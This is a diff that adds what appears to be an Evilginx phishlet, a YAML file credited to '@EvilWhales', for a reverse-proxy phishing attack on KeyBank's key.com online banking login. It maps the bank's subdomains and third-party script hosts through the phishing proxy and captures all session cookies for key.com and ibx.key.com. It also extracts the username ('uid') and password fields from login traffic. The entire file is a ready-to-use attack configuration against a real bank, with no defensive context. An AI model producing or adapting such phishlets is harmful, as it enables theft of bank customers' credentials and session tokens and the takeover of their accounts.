@@ -1,0 +1,103 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'key.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'dok.js-cdn', orig_sub: 'dok.js-cdn', domain: 'dynatrace.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'rum', orig_sub: 'rum', domain: 'hlx.page', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'adobedtm.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ibx', orig_sub: 'ibx', domain: 'key.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'company-target.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'fullstory.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'target', orig_sub: 'target', domain: 'key.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'everestjs.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tag', orig_sub: 'tag', domain: 'demandbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'rs', orig_sub: 'rs', domain: 'fullstory.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'company-target.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'id', orig_sub: 'id', domain: 'rlcdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'tag-logger', orig_sub: 'tag-logger', domain: 'demandbase.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'data', orig_sub: 'data', domain: 'adxcel-ec2.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pixel', orig_sub: 'pixel', domain: 'byspotify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bat', orig_sub: 'bat', domain: 'bing.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'snap', orig_sub: 'snap', domain: 'licdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'metrics', orig_sub: 'metrics', domain: 'key.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'lasteventf-tm', orig_sub: 'lasteventf-tm', domain: 'everesttech.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pixels', orig_sub: 'pixels', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'googleads.g', orig_sub: 'googleads.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wss', orig_sub: 'www', domain: 'google.ru', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js-agent', orig_sub: 'js-agent', domain: 'newrelic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'bam', orig_sub: 'bam', domain: 'nr-data.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cm', orig_sub: 'cm', domain: 'everesttech.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'bf36599ame.bf', orig_sub: 'bf36599ame.bf', domain: 'dynatrace.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.key.com', orig_sub: 'www', domain: 'key.com', search: 'https://{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'dok.js-cdn', domain: 'dynatrace.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'rum', domain: 'hlx.page', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'ibx', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'api', domain: 'company-target.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'edge', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'target', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'www', domain: 'everestjs.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'tag', domain: 'demandbase.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'rs', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 's', domain: 'company-target.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'id', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'tag-logger', domain: 'demandbase.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'data', domain: 'adxcel-ec2.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'pixel', domain: 'byspotify.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'bat', domain: 'bing.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'snap', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'metrics', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'lasteventf-tm', domain: 'everesttech.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'pixels', domain: 'spotify.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'googleads.g', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'www', domain: 'google.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'js-agent', domain: 'newrelic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'bam', domain: 'nr-data.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'cm', domain: 'everesttech.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.key.com', orig_sub: 'bf36599ame.bf', domain: 'dynatrace.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+  - {triggers_on: 'ibx.key.com', orig_sub: 'ibx', domain: 'key.com', search: 'https://{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'resources.digital-cloud-west', domain: 'medallia.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'edge', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'nd', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'rs', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'platform-websdk', domain: 'transmitsecurity.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'analytics-fe.digital-cloud-west', domain: 'medallia.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'target', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'cdn', domain: 'walkme.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'metrics', domain: 'key.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ibx.key.com', orig_sub: 'ec', domain: 'walkme.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'ibx.key.com'
+    keys: ['.*,regexp']
+  - domain: '.key.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/login'
+  - '/'
+
+credentials:
+  username:
+    key: 'uid'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'json'
+
+login:
+  domain: 'www.key.com'
+  path: '/personal/index.html'
